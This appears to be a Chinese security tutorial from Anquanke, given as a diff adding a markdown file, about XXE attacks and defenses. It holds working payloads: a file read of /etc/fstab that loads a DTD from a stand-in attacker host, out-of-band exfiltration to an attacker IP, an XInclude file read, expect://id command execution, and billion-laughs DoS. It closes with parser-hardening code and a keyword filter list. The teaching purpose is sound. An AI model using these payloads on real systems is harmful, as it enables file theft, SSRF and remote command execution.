@@ -1,0 +1,495 @@
+# 【技术分享】XXE漏洞攻防之我见
+
+阅读量 **399154**
+
+|评论 **2**
+
+|![](https://p0.ssl.qhimg.com/sdm/30_30_100/t01f942715e2a0f1a23.png)
+
+发布时间 : 2017-05-12 10:09:57
+
+ **x**
+
+##### 译文声明
+
+本文是翻译文章，文章来源：安全客
+
+译文仅供参考，具体内容表达以及含义原文为准。
+
+作者：[ **激越王**](http://bobao.360.cn/member/contribute?uid=2577494374)
+
+**预估稿费：400RMB**
+
+投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
+
+  
+
+你是否听说过xml注入攻击呢，或者对它只知其一不知其二呢？
+
+现在让我们从xml相关基础知识开始，一步步了解xml攻击的原理和方式。
+
+这篇文章主要针对扫盲，请大佬们轻喷，有错误的地方欢迎指出。
+
+XML 被设计为传输和存储数据，其焦点是数据的内容。
+
+HTML 被设计用来显示数据，其焦点是数据的外观。
+
+XML 把数据从 HTML 分离。
+
+XML 是独立于软件和硬件的信息传输工具。
+
+    
+    
+    <bookstore> <!--根元素-->
+    <book category="COOKING"> <!--bookstore的子元素，category为属性-->
+    <title>Everyday Italian</title>      <!--book的子元素，lang为属性-->
+    <author>Giada De Laurentiis</author>       <!--book的子元素-->
+    <year>2005</year> <!--book的子元素-->
+    <price>30.00</price> <!--book的子元素-->
+    </book> <!--book的结束-->
+    </bookstore> <!--bookstore的结束-->
+
+XML 中，一些字符拥有特殊的意义。为了避免这个错误，请用实体引用来代替特殊字符
+
+附表一
+
+附表一注释：在 XML 中，只有字符 "<" 和 "&" 确实是非法的。大于号是合法的，但是用实体引用来代替它是一个好习惯。
+
+合法的 XML 文档是“形式良好”的 XML 文档，同样遵守文档类型定义 (DTD) 的语法规则。
+
+  
+
+**DTD介绍**
+
+文档类型定义（DTD）可定义合法的XML文档构建模块。它使用一系列合法的元素来定义文档的结构。
+
+DTD 可被成行地声明于 XML 文档中，也可作为一个外部引用。
+
+带有 DTD 的 XML 文档实例
+
+    
+    
+    <?xml version="1.0"?>
+    <!DOCTYPE note [<!--定义此文档是 note 类型的文档-->
+    <!ELEMENT note (to,from,heading,body)><!--定义note元素有四个元素-->
+    <!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
+    <!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
+    <!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
+    <!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->
+    ]>
+    <note>
+    <to>Dave</to>
+    <from>Tom</from>
+    <head>Reminder</head>
+    <body>You are a good man</body>
+    </note>
+
+实例
+
+源码
+
+当DTD 位于 XML 源文件的外部，通过下面的语法被封装在一个 DOCTYPE 定义中
+
+    
+    
+    <!DOCTYPE root-element SYSTEM "filename">
+
+外部DTD实例
+
+    
+    
+    <?xml version="1.0"?>
+    <!DOCTYPE note SYSTEM "note.dtd"><!--申明语句-->
+    <note>
+      <to>Dave</to>
+      <from>Tom</from>
+      <heading>Reminder</heading>
+      <body>You are a good man</body>
+    </note>
+
+"note.dtd" 文件
+
+    
+    
+    <!ELEMENT note (to,from,heading,body)><!--定义note元素有四个元素-->
+    <!ELEMENT to (#PCDATA)><!--定义to元素为”#PCDATA”类型-->
+    <!ELEMENT from (#PCDATA)><!--定义from元素为”#PCDATA”类型-->
+    <!ELEMENT head (#PCDATA)><!--定义head元素为”#PCDATA”类型-->
+    <!ELEMENT body (#PCDATA)><!--定义body元素为”#PCDATA”类型-->
+
+实例
+
+源码
+
+dtd文件
+
+PCDATA 的意思是被解析的字符数据（parsed character data）。PCDATA
+是会被解析器解析的文本。这些文本将被解析器检查实体以及标记。文本中的标签会被当作标记来处理，而实体会被展开。不过，被解析的字符数据不应当包含任何 &、<
+或者 > 字符；需要使用 &amp;、&lt; 以及 &gt; 实体来分别替换它们。
+
+CDATA 的意思是字符数据（character data）。CDATA
+是不会被解析器解析的文本。在这些文本中的标签不会被当作标记来对待，其中的实体也不会被展开。
+
+  
+
+**DTD元素**
+
+备注：由于仅仅是扩展，所以仅展示一些常用的元素语法
+
+  
+
+**DTD – 属性**
+
+属性声明使用下列语法：
+
+    
+    
+    <!ATTLIST 元素名称 属性名称 属性类型 默认值>
+
+DTD 实例:
+
+    
+    
+    <!ATTLIST payment type CDATA "check">
+
+XML 实例:
+
+    
+    
+    <payment type="check" />
+
+以下是属性类型的选项：
+
+默认值参数可使用下列值：
+
+  
+
+**DTD – 实体（重要）**
+
+实体是用于定义引用普通文本或特殊字符的快捷方式的变量。
+
+实体引用是对实体的引用。
+
+实体可在内部或外部进行声明。
+
+  
+
+**Schema 介绍（XSD）**
+
+XML Schema 是基于 XML 的 DTD 替代者。
+
+XML Schema 描述 XML 文档的结构。
+
+XML Schema 语言也可作为 XSD（XML Schema Definition）来引用
+
+但是目前XSD对本文的XXE攻击相关性不是太大，如果有大佬想深入了解可以到 <http://www.w3cschool.cn/xmlschema/> 或
+<http://www.phpstudy.net/e/schema/> 学习
+
+  
+
+**攻击套路**
+
+**一般技巧：**
+
+1.引用外部实体远程文件读取
+
+2.URL请求(可借此发起ssrf)
+
+3.参数实体
+
+4.通过 XInclude 包含外部资源
+
+5.DoS
+
+**1\. 外部实体引用**
+
+通过外部实体引用，可以获取远程文件内容
+
+本地实验：
+
+test.txt 文件中的内容就是 123123admin
+
+但是有个问题，如果文件内容格式太过复杂，就会导致 xml 解析失败(比如内容里含有 空格、一些特殊字符 < > & ; 之类的文件)
+
+这个其实有绕过方法的，如上文所述，可以利用 参数实体，具体的内容后面介绍
+
+还有一个我们知道的方法，就是使用 php 伪协议，php://filter 读取文件内容（ 文件内容经过 base64 过滤器，就是全字符的，没有格式干扰）
+
+**2\. URL 请求(ssrf)**
+
+直接使用外部实体引用就可以发起一个请求，原因是很多 xml 解析器读取到引用外部文件的模块时，就会强制性发出请求
+
+本地实验:
+
+首先在 172.16.169.153 监听 1231 端口：
+
+在 172.16.169.142 利用 xml 发出请求（将 xml 放入浏览器即可）
+
+如上图，浏览器一直处于加载内容状态，这是因为 153 的机器上没有返回信息…
+
+172.16.169.153 的 1231 端口状态：
+
+这个 ssrf 可以值得注意一下，因为对 xml 的攻击中，大都是使用 外部实体引用，那么如果直接加载 xml 的时候，禁止外部实体引用呢？
+
+这种情况下，大多数攻击都会失效，但是 ssrf 不会
+
+别忘了请求外部资源还有一种方式，直接使用 DOCTYPE
+
+**3\. DoS**
+
+任何能大量占用服务器资源的方法都可以造成 DoS，这个的原理就是递归引用
+
+lol 实体具体还有 "lol" 字符串，然后一个 lol2 实体引用了 10 次 lol 实体，一个 lol3 实体引用了 10 次 lol2
+实体，此时一个 lol3 实体就含有 10^2 个 "lol" 了，以此类推，lol9 实体含有 10^8 个 "lol" 字符串…
+
+那么，引用 lol9，boom…
+
+**4\. 参数实体**
+
+参数实体，之前在远程文件读取的介绍中，可以绕过文件内容复杂导致解析失败的限制
+
+参数实体以%开头 我们使用参数实体只需要遵循两条原则：
+
+1.参数实体只能在DTD声明中使用。 2.参数实体中不能再引用参数实体。
+
+如图，/etc/fstab 是一个内容复杂的文件，如果直接利用 SYSTEM 请求远程文件会解析出错的，也就是读不到文件内容。
+
+那么就可以使用参数实体进行绕过 xml 严格的语法规则
+
+其实流程很简单：
+
+start 参数实体的内容： <! [CDATA[
+
+goodies 参数实体的内容： file:///etc/fastab （使用 file 协议读取文件）
+
+end 参数实体的内容：]]>
+
+然后接着定义了一个 dtd 参数实体，使用 SYSTEM 发出获取 combine.dtd 的内容
+
+并且在 DTD 内部引用了 dtd 参数实体，那么这个时候，源文件中的 DTD 应该是这样：
+
+    
+    
+    <!ENTITY % start "<![CDATA[">
+    <!ENTITY % goodies SYSTEM "file:///etc/fstab">
+    <!ENTITY % end "]]>">
+    <!ENTITY % dtd SYSTEM "http://evil.example.com/combine.dtd">
+    <!ENTITY all "%start;%goodies;%end;">
+
+最后，再由源文件中引用 all 普通实体引发文件读取：
+
+    
+    
+    <roottag><! [CDATA["/etc/fstab文件的内容"]]></roottag>
+
+其中这个 CDATA 的意思是为 文件内容添加属性：不被解析的普通字符
+
+这样，参数实体的引用就不需要在xml文档解析的时候保持xml闭合,xml 解释器就会直接忽略文件内容的语法规则，达到了绕过的目的
+
+攻击方ip：
+
+    
+    
+    http://192.168.229.130/
+    eval.dtd
+    1.php
+
+服务器IP
+
+    
+    
+    http://192.168.229.128/
+    2.php
+
+在攻击方的WEB目录上有一个叫做eval.dtd文件用于攻击，然后在服务器上传2.php，执行2.php
+
+报错没关系。
+
+下面看一下代码：
+
+1.php:
+
+简单的接受get参数传的内容然后保存在1.txt下
+
+EVAL.DTD文件的内容为
+
+这里注意使用参数实体时，在引用实体的格式中需要编码用&#X25代替 %，由于嵌套引用外部参数实体，如果直接利用%，在引用的时候会导致找不到该参数实体名称
+
+作用为将接受到外部file实体应用到1.php?file=的%file上
+
+这样在服务器上传来的内容就会传到file参数上然后保存到1.txt上
+
+在2.PHP文件中
+
+第一个ENTITY用于读取服务器本地文件test.txt
+
+第二个用于引用远程dtd文件
+
+然后在实体利用上需要注意顺序，先执行名为dtd实体引用攻击方eval.dtd的代码获得了实体send的执行方式http://192.168.229.130/1.php?file=%file;
+
+然后将file实体获得的内容引用到192.168.229.130/1.php?file
+
+至此攻击完成，攻击方服务器以保存了1.txt
+
+这里提一下前面说过的，在读取文件的时候当存在空格，尖括号的时候这种直接读取内容的方式会报错
+
+显示无效url，抓包时抓不到在浏览器上访问http://192.168.229.130/1.php?file=blessing software的包
+
+结合之前的的协议应用，可以使用常用的php://filter读取base64编码
+
+如下
+
+解码即可。
+
+只是选了几个协议作为例子，这里的协议都能使用。
+
+这里附加几个关于xxe漏洞的英文文档和实例：
+
+<http://www.synacktiv.fr/ressources/synacktiv_drupal_xxe_services.pdf>
+
+<http://www.2cto.com/article/201506/404505.html> —-Z-BLOG任意文件读取
+
+**5\. 通过 Xinclude 包含外部资源**
+
+基于XInclude的文件包含,使用的另一套 xml 语法约束：XML schema
+
+XInclude提供了一种较为方便的取回数据的思路(再也不用担心数据不完整而导致parser抛出一个错误)而我们能够通过parse属性，强制引用文件的类型。
+
+    
+    
+    <root xmlns:xi="http://www.w3.org/2001/XInclude">
+     <xi:include href="file:///etc/fstab" parse="text"/>
+    </root>
+
+不过Xinclude需要手动开启，测试发现所有xml parser都默认关闭这一特性。
+
+  
+
+**PHP 和 JAVA 环境**
+
+**php 支持的扩展协议**
+
+**Java &Xerces**
+
+默认的Oracle's Java Runtime Environment下的XML
+parser是Xerces，一个apache的项目。而Xerces和Java提供了一系列的特性，这些特性又能导致一些严重的安全问题。上述的那些攻击手法(DOCTYPEs
+for SSRF,文件读取,参数实体的外带数据)在java的默认配置下能够运用自如,java/Xerces也支持XInclude
+但是需要setXIncludeAware(true) 和setNamespaceAware(true)。
+
+**php &expect的RCE**
+
+很遗憾，这个扩展并不是默认安装的，然而安装了这个扩展的XXE漏洞，是能够执行任意命令。
+
+    
+    
+    <!DOCTYPE root[<!ENTITY cmd SYSTEM "expect://id">]>
+    <dir>
+    <file>&cmd;</file>
+    </dir>
+
+还有 python、.net 环境等
+
+  
+
+**防御**
+
+**1 直接使用开发语言提供的禁用外部实体的方法**
+
+这样其实没法防御 xml 制造的 ssrf
+
+PHP：
+
+    
+    
+    libxml_disable_entity_loader(true);
+
+JAVA:
+
+    
+    
+    DocumentBuilderFactory dbf =DocumentBuilderFactory.newInstance();
+    dbf.setExpandEntityReferences(false);
+
+Python：
+
+    
+    
+    from lxml import etree
+    xmlData = etree.parse(xmlSource,etree.XMLParser(resolve_entities=False))
+
+**2 过滤用户提交的 xml 数据**
+
+敏感关键词： <!DOCTYPE 、 <!ENTITY、SYSTEM、PUBLIC
+
+  
+
+**总结**
+
+XML 攻击大都是由解析器发出外部资源请求而造成的，还有结合一些协议的特性可以轻松绕过 xml 格式要求。其中主要的关键字
+DOCTYPE（DTD的声明），ENTITY（实体的声明）， SYSTEM、PUBLIC（外部资源申请）。
+
+由与 普通实体 和 参数实体 的灵活引用，从而引发各种套路
+
+  
+
+**资料来源**
+
+<http://www.w3cschool.cn/xml>
+
+<http://www.w3cschool.cn/dtd>
+
+<http://www.phpstudy.net/e/xml>
+
+<http://www.w3school.com.cn/dtd/dtd_intro.asp>
+
+<https://security.tencent.com/index.php/blog/msg/69>
+
+<http://blog.csdn.net/u011721501/article/details/43775691>
+
+<https://www.owasp.org/index.php/XML_External_Entity_(XXE)_Processing>
+
+<https://msdn.microsoft.com/en-us/magazine/ee335713.aspx>
+
+<https://www.vsecurity.com//download/papers/XMLDTDEntityAttacks.pdf>
+
+<http://www.myhack58.com/Article/html/3/8/2016/70831_3.htm>
+
+<http://www.freebuf.com/articles/web/97833.html>
+
+<http://blog.csdn.net/lijizh1013/article/details/8056304>
+
+<http://www.w3school.com.cn/dtd/dtd_intro.asp>
+
+<http://www.w3school.com.cn/schema/schema_intro.asp>
+
+<http://www.cnblogs.com/mengdd/archive/2013/05/30/3107361.html>
+
+本文翻译自安全客 [原文链接]()。如若转载请注明出处。
+
+商务合作，文章发布请联系 anquanke@360.cn
+
+本文由 **0xJ** 原创发布
+
+转载，请参考[转载声明](https://www.anquanke.com/note/repost)，注明出处：
+[https://www.anquanke.com/post/id/86075](/post/id/86075)
+
+安全客 - 有思想的安全新媒体
+
+本文转载自: [安全客]()
+
+如若转载,请注明出处： []()
+
+安全客 - 有思想的安全新媒体
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
+  * [安全知识](/tag/安全知识)
+
+ **+1** __4赞
+
+ __收藏
+
+![](https://p2.ssl.qhmsg.com/dm/200_200_100/t00df551a583a87f4e9.jpg) 0xJ
+
+分享到：![微信](https://p0.ssl.qhimg.com/sdm/28_28_100/t01e29062a5dcd13c10.png)
+
